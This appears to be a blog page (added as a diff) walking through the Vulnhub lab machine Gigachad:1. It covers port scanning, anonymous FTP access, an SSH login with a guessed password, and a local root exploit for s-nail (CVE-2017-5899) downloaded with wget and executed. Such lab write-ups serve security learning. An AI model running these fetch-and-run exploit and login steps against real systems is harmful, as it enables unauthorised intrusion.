@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Nikit Writeups</title>
+        <!-- Favicon-->
+        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
+            <div class="container">
+                <a class="navbar-brand js-scroll-trigger" href="#page-top">Nikit Penkar</a>
+                <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#solution">Solution</a></li>
+                        <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/myblog/index.html">Back To Home</a></li>
+                        
+
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="bg-gradient-main">
+            <!-- Masthead-->
+            <header class="masthead text-white text-center">
+                <div class="container d-flex align-items-center flex-column">
+                    <!-- Masthead Avatar Image-->
+                    <img class="masthead-avatar mb-5" src="assets/img/avataaars.svg" alt="" />
+                    <!-- Masthead Heading-->
+                    <h1 class="masthead-heading text-uppercase mb-0">Gigachad:1 Vulnhub Walkthrough</h1>
+                    <!-- Icon Divider-->
+                    <div class="divider-custom divider-light">
+                        <div class="divider-custom-line"></div>
+                        <div class="divider-custom-icon"><i class="fas fa-star"></i></div>
+                        <div class="divider-custom-line"></div>
+                    </div>
+                    <!-- Masthead Subheading-->
+                    <p class="masthead-subheading font-weight-light mb-0">
+                        Level : Beginner / Intermediate
+                    </p>
+                    <p class="masthead-subheading font-weight-light mt-2">
+                        Goal: Find user flag and root flag
+                    </p>
+                </div>
+            </header>
+        </div> 
+        <section class="page-section bgbody text-white mb-0" id="solution">
+            <div class="container">
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark">Summary</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        This is a writeup for the Vulnhub Machine - Gigachad:1 which was released by tasiyanci
+                    </div>
+                </div>
+                
+
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Machine Discovery</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        First we will use nmap -sn 192.168.1.0/24 to discover the machine in your network. (I have assigned an IP of 192.168.1.0/24 range to my machine)
+                    </div>
+                </div>
+
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Port Scanning</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        Once the machine is discovered, we will do a port scan using nmap
+                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                            nmap -A -T4 -p- 192.168.1.5    
+                        </p>                      
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                <!-- Portfolio Item 1-->
+                    <div class="col-md-6 col-lg-4">
+                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal1">
+                            
+                            <img class="img-fluid" src="assets/img/gigachad/nmap.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-labelledby="portfolioModal1Label" aria-hidden="true">
+                    <div class="modal-dialog modal-xl" role="document">
+                        <div class="modal-content">
+                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                            </button>
+                            <div class="modal-body text-center">
+                                <div class="container">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8">
+                                            
+                                            <!-- Portfolio Modal - Image-->
+                                            <img class="img-fluid rounded mb-5" src="assets/img/gigachad/nmap.png" alt="" />
+                                            
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                    
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Exploiting User Flag</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        We discovered three open ports which are FTP(21), SSH (22) and HTTP(80)<br>
+                        We can start by Port 80, but there is nothing on the website<br>
+                        We can see that for FTP, anonymous login is allowed. Hence we will try logging in to FTP
+                        ftp 192.168.1.5<br>
+                        Username will be anonymous and password will be blank(press enter at password prompt)<br>
+                        We will use dir or ls command to view the files. As you can see we have found a file called chadinfo<br>
+                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                            ftp 192.168.1.5   
+                        </p>                      
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                <!-- Portfolio Item 1-->
+                    <div class="col-md-6 col-lg-4">
+                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal2">
+                            
+                            <img class="img-fluid" src="assets/img/gigachad/ftp.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="portfolio-modal modal fade" id="portfolioModal2" tabindex="-1" role="dialog" aria-labelledby="portfolioModal2Label" aria-hidden="true">
+                    <div class="modal-dialog modal-xl" role="document">
+                        <div class="modal-content">
+                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                            </button>
+                            <div class="modal-body text-center">
+                                <div class="container">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8">
+                                            
+                                            <!-- Portfolio Modal - Image-->
+                                            <img class="img-fluid rounded mb-5" src="assets/img/gigachad/ftp.png" alt="" />
+                                            
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                        We will download the file using get command
+                        </p>                      
+                    </div>
+                </div>
+
+                <div class="row justify-content-center">
+                    <!-- Portfolio Item 1-->
+                        <div class="col-md-6 col-lg-4">
+                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal3">
+                                
+                                <img class="img-fluid" src="assets/img/gigachad/get.png" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                    <div class="portfolio-modal modal fade" id="portfolioModal3" tabindex="-1" role="dialog" aria-labelledby="portfolioModal3Label" aria-hidden="true">
+                        <div class="modal-dialog modal-xl" role="document">
+                            <div class="modal-content">
+                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                </button>
+                                <div class="modal-body text-center">
+                                    <div class="container">
+                                        <div class="row justify-content-center">
+                                            <div class="col-lg-8">
+                                                
+                                                <!-- Portfolio Modal - Image-->
+                                                <img class="img-fluid rounded mb-5" src="assets/img/gigachad/get.png" alt="" />
+                                                
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                            Now lets open the file using cat
+                            </p>                      
+                        </div>
+                    </div>
+                    
+                    <div class="row justify-content-center">
+                        <!-- Portfolio Item 1-->
+                            <div class="col-md-6 col-lg-4">
+                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal4">
+                                    
+                                    <img class="img-fluid" src="assets/img/gigachad/cat.png" alt="" />
+                                </div>
+                            </div>
+                        </div>
+                        <div class="portfolio-modal modal fade" id="portfolioModal4" tabindex="-1" role="dialog" aria-labelledby="portfolioModal4Label" aria-hidden="true">
+                            <div class="modal-dialog modal-xl" role="document">
+                                <div class="modal-content">
+                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                    </button>
+                                    <div class="modal-body text-center">
+                                        <div class="container">
+                                            <div class="row justify-content-center">
+                                                <div class="col-lg-8">
+                                                    
+                                                    <!-- Portfolio Modal - Image-->
+                                                    <img class="img-fluid rounded mb-5" src="assets/img/gigachad/cat.png" alt="" />
+                                                    
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="row">
+                            <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                We got the username as chad and for password they have given us the directory /drippinchad.png. Lets check it out<br>
+                                After opening http://192.168.1.5/drippinchad.png in browser, we get the below page  
+                                </p>                      
+                            </div>
+                        </div>
+                        
+                        <div class="row justify-content-center">
+                            <!-- Portfolio Item 1-->
+                                <div class="col-md-6 col-lg-4">
+                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal5">
+                                        
+                                        <img class="img-fluid" src="assets/img/gigachad/httpdrippinchad.png" alt="" />
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="portfolio-modal modal fade" id="portfolioModal5" tabindex="-1" role="dialog" aria-labelledby="portfolioModal5Label" aria-hidden="true">
+                                <div class="modal-dialog modal-xl" role="document">
+                                    <div class="modal-content">
+                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                        </button>
+                                        <div class="modal-body text-center">
+                                            <div class="container">
+                                                <div class="row justify-content-center">
+                                                    <div class="col-lg-8">
+                                                        
+                                                        <!-- Portfolio Modal - Image-->
+                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/httpdrippinchad.png" alt="" />
+                                                        
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                    According to the caption the password must be related to the place in the picture. If you know this place then skip the below steps. If you don’t know then we will download the image and do a reverse image lookup on Google<br>
+                                    Go to Google Images and the click on the Camera Icon  
+                                    </p>                      
+                                </div>
+                            </div>
+                            
+                            <div class="row justify-content-center">
+                                <!-- Portfolio Item 1-->
+                                    <div class="col-md-6 col-lg-4">
+                                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal6">
+                                            
+                                            <img class="img-fluid" src="assets/img/gigachad/googlerevimg.png" alt="" />
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="portfolio-modal modal fade" id="portfolioModal6" tabindex="-1" role="dialog" aria-labelledby="portfolioModal6Label" aria-hidden="true">
+                                    <div class="modal-dialog modal-xl" role="document">
+                                        <div class="modal-content">
+                                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                            </button>
+                                            <div class="modal-body text-center">
+                                                <div class="container">
+                                                    <div class="row justify-content-center">
+                                                        <div class="col-lg-8">
+                                                            
+                                                            <!-- Portfolio Modal - Image-->
+                                                            <img class="img-fluid rounded mb-5" src="assets/img/gigachad/googlerevimg.png" alt="" />
+                                                            
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="row">
+                                    <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                        Now browse the files and insert your image
+                                        </p>                      
+                                    </div>
+                                </div>
+                                
+                                <div class="row justify-content-center">
+                                    <!-- Portfolio Item 1-->
+                                        <div class="col-md-6 col-lg-4">
+                                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal7">
+                                                
+                                                <img class="img-fluid" src="assets/img/gigachad/googlerevimg2.png" alt="" />
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="portfolio-modal modal fade" id="portfolioModal7" tabindex="-1" role="dialog" aria-labelledby="portfolioModal7Label" aria-hidden="true">
+                                        <div class="modal-dialog modal-xl" role="document">
+                                            <div class="modal-content">
+                                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                </button>
+                                                <div class="modal-body text-center">
+                                                    <div class="container">
+                                                        <div class="row justify-content-center">
+                                                            <div class="col-lg-8">
+                                                                
+                                                                <!-- Portfolio Modal - Image-->
+                                                                <img class="img-fluid rounded mb-5" src="assets/img/gigachad/googlerevimg2.png" alt="" />
+                                                                
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <div class="row">
+                                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                            You will see some links which shows this place
+                                            </p>                      
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="row justify-content-center">
+                                        <!-- Portfolio Item 1-->
+                                            <div class="col-md-6 col-lg-4">
+                                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal8">
+                                                    
+                                                    <img class="img-fluid" src="assets/img/gigachad/googlesearch.png" alt="" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="portfolio-modal modal fade" id="portfolioModal8" tabindex="-1" role="dialog" aria-labelledby="portfolioModal8Label" aria-hidden="true">
+                                            <div class="modal-dialog modal-xl" role="document">
+                                                <div class="modal-content">
+                                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                    </button>
+                                                    <div class="modal-body text-center">
+                                                        <div class="container">
+                                                            <div class="row justify-content-center">
+                                                                <div class="col-lg-8">
+                                                                    
+                                                                    <!-- Portfolio Modal - Image-->
+                                                                    <img class="img-fluid rounded mb-5" src="assets/img/gigachad/googlesearch.png" alt="" />
+                                                                    
+                                                                    
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+
+                                        
+                                    <div class="row">
+                                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                            I followed the second link and then found that the name is Maiden’s tower<br>
+                                            We had discovered Port 22 (SSH) open so we will login with user chad (which we got from the chadinfo file) and we will guess the password something related to Maiden’s tower<br>
+                                            After guessing for sometime, I found that the password is maidenstower<br>
+                                            So we will login into SSH with username:chad and password:maidenstower<br>
+                                            </p>
+                                            <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                            ssh chad@192.168.1.5
+                                            </p>                      
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="row justify-content-center">
+                                        <!-- Portfolio Item 1-->
+                                            <div class="col-md-6 col-lg-4">
+                                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal9">
+                                                    
+                                                    <img class="img-fluid" src="assets/img/gigachad/sshchad.png" alt="" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="portfolio-modal modal fade" id="portfolioModal9" tabindex="-1" role="dialog" aria-labelledby="portfolioModal9Label" aria-hidden="true">
+                                            <div class="modal-dialog modal-xl" role="document">
+                                                <div class="modal-content">
+                                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                    </button>
+                                                    <div class="modal-body text-center">
+                                                        <div class="container">
+                                                            <div class="row justify-content-center">
+                                                                <div class="col-lg-8">
+                                                                    
+                                                                    <!-- Portfolio Modal - Image-->
+                                                                    <img class="img-fluid rounded mb-5" src="assets/img/gigachad/sshchad.png" alt="" />
+                                                                    
+                                                                    
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="row">
+                                            <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                After doing ls we got our user flag user.txt
+                                                </p>                      
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal10">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/usertxt.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal10" tabindex="-1" role="dialog" aria-labelledby="portfolioModal10Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/usertxt.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+    
+
+                                            <!--Section Heading-->
+                                            <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Exploiting Root Flag</h2>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                                                    For escalating privileges, we can try by finding sudo permissions for user chad<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;    
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal11">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/findperm.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal11" tabindex="-1" role="dialog" aria-labelledby="portfolioModal11Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/findperm.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>                        
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    After researching the services, I found s-nail service which is used for mails. It also has privilege escalation exploits available with CVE-2017–5899   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal12">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/exploitsearch.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal12" tabindex="-1" role="dialog" aria-labelledby="portfolioModal12Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/exploitsearch.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    I used the below Github exploit as the payload   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal13">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/rawcodeexploit.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal13" tabindex="-1" role="dialog" aria-labelledby="portfolioModal13Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/rawcodeexploit.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    In the Home directory, download the exploit.sh using wget<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4">
+                                                    wget https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal14">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/wget.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal14" tabindex="-1" role="dialog" aria-labelledby="portfolioModal14Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/wget.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Now we will give executable permissions to our exploit.sh using chmod<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    chmod 777 exploit.sh<br>
+                                                    </p>
+                                                    <p class="lead text-dark mt-5 ml-4" >
+                                                    And then we will run the exploit<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    ./exploit.sh<br>   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal15">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/runexploit.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal15" tabindex="-1" role="dialog" aria-labelledby="portfolioModal15Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/runexploit.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We will get a Success message and we will get our root shell   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal16">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/rootshell.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal16" tabindex="-1" role="dialog" aria-labelledby="portfolioModal16Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/rootshell.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Go to /root directory and we got our last flag which is the root flag root.txt !   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal17">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/gigachad/roottxt.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal17" tabindex="-1" role="dialog" aria-labelledby="portfolioModal17Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/gigachad/roottxt.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Thanks for reading! :)   
+                                                    </p>                      
+                                                </div>
+                                            </div>    
+
+
+            </div>
+        </section>
+
+
+        <!-- Copyright Section-->
+        <div class="copyright py-4 text-center text-white">
+            <div class="container"><small>Copyright © NikitPenkar 2021</small></div>
+        </div>
+        <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes)-->
+        <div class="scroll-to-top d-lg-none position-fixed">
+            <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top"><i class="fa fa-chevron-up"></i></a>
+        </div>
+
+        <!-- Bootstrap core JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Third party plugin JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+        <!-- Contact form JS-->
